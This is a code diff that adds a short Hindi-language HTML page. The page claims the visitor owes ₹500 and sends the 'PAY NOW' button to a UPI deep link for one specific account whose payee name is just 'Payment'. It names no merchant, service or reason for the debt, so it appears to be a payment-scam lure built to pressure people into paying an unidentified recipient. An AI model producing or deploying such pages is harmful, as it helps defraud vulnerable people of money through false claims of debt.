@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>₹500 Payment Due</title>
+<style>
+body {
+  background:#101827;
+  color:white;
+  font-family:Arial;
+  text-align:center;
+  padding:35px 15px;
+}
+.card {
+  background:#1e293b;
+  padding:30px 20px;
+  border-radius:18px;
+  margin-top:50px;
+}
+.amount {
+  font-size:48px;
+  color:#ffcc44;
+  font-weight:bold;
+}
+button {
+  background:#16a34a;
+  color:white;
+  border:0;
+  padding:17px;
+  width:100%;
+  border-radius:12px;
+  font-size:19px;
+  margin-top:25px;
+}
+</style>
+</head>
+<body>
+<div class="card">
+<h1>PAYMENT DUE</h1>
+<p>आपका बकाया भुगतान</p>
+<div class="amount">₹500</div>
+<p>कृपया ₹500 का भुगतान करें।</p>
+<button onclick="location.href='upi://pay?pa=902651316@axl&pn=Payment&am=500&cu=INR'">
+PAY NOW ₹500
+</button>
+<p id="status">भुगतान की पुष्टि होने की प्रतीक्षा है।</p>
+</div>
+</body>
+</html>
